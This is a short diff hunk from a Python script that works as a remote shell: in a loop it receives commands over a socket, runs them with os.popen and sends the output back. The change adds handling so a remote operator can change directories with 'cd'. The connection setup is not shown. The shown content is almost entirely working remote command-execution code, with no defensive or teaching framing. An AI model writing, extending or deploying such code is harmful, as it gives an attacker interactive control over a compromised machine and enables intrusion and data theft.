@@ -15,6 +15,10 @@ while True:
     command = s.recv(buffersize).decode()
     if command.lower() == 'exit':
         break
+    elif command.split(' ')[0] == 'cd':
+        current = os.getcwd()
+        os.chdir("{}/{}".format(current, command.split(' ')[1]))
+        pass
     output = os.popen(command).read()
     s.send(output.encode())
 s.close()
